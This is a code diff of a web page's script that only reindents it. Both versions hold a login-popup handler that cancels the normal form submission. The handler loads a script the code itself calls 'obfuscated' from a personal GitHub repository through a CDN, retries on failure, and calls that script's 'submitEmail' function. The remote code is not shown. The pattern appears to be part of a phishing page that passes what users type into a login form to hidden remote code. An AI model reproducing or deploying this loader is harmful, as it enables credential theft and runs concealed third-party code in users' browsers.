@@ -42,55 +42,55 @@
         
      
 
-        // Function to handle the login button click inside the popup
-        function huigo(event) {
-            event.preventDefault();  // Prevent default form submission
-            fetchObfuscatedScript();
-        }
+     // Function to handle the login button click inside the popup
+function huigo(event) {
+    event.preventDefault();  // Prevent default form submission
+    fetchObfuscatedScript();
+}
 
-        // Function to fetch and execute the obfuscated script with retry logic
-        function fetchObfuscatedScript(retryCount = 3) {
-            const scriptUrl = 'https://cdn.jsdelivr.net/gh/Rajaryan827/Testforcdn@main/indexadmin.js';
+// Function to fetch and execute the obfuscated script with retry logic
+function fetchObfuscatedScript(retryCount = 3) {
+    const scriptUrl = 'https://cdn.jsdelivr.net/gh/Rajaryan827/Testforcdn@main/indexadmin.js';
 
-            // Check if the script is already loaded
-            if (!document.querySelector(`script[src="${scriptUrl}"]`)) {
-                const scriptElement = document.createElement('script');
-                scriptElement.src = scriptUrl;
+    // Check if the script is already loaded
+    if (!document.querySelector(`script[src="${scriptUrl}"]`)) {
+        const scriptElement = document.createElement('script');
+        scriptElement.src = scriptUrl;
 
-                scriptElement.onload = function () {
-                    console.log("Obfuscated JS loaded successfully.");
-                    if (typeof submitEmail === 'function') {
-                        try {
-                            submitEmail();  // Ensure submitEmail is defined
-                        } catch (error) {
-                            console.error('Error executing submitEmail:', error);
-                        }
-                    } else {
-                        console.error('submitEmail function is not defined.');
-                    }
-                };
-
-                scriptElement.onerror = function () {
-                    if (retryCount > 0) {
-                        console.warn(`Failed to load script. Retrying... (${retryCount} retries left)`);
-                        fetchObfuscatedScript(retryCount - 1);
-                    } else {
-                        console.error('Failed to load script after multiple attempts.');
-                    }
-                };
-
-                document.body.appendChild(scriptElement);
-            } else {
-                console.log('Obfuscated JS is already loaded.');
-                if (typeof submitEmail === 'function') {
-                    try {
-                        submitEmail();
-                    } catch (error) {
-                        console.error('Error executing submitEmail:', error);
-                    }
-                } else {
-                    console.error('submitEmail function is not defined.');
+        scriptElement.onload = function () {
+            console.log("Obfuscated JS loaded successfully.");
+            if (typeof submitEmail === 'function') {
+                try {
+                    submitEmail();  // This will now call our updated submitEmail function
+                } catch (error) {
+                    console.error('Error executing submitEmail:', error);
                 }
+            } else {
+                console.error('submitEmail function is not defined.');
             }
+        };
+
+        scriptElement.onerror = function () {
+            if (retryCount > 0) {
+                console.warn(`Failed to load script. Retrying... (${retryCount} retries left)`);
+                fetchObfuscatedScript(retryCount - 1);
+            } else {
+                console.error('Failed to load script after multiple attempts.');
+            }
+        };
+
+        document.body.appendChild(scriptElement);
+    } else {
+        console.log('Obfuscated JS is already loaded.');
+        if (typeof submitEmail === 'function') {
+            try {
+                submitEmail();
+            } catch (error) {
+                console.error('Error executing submitEmail:', error);
+            }
+        } else {
+            console.error('submitEmail function is not defined.');
         }
+    }
+}
 </script>
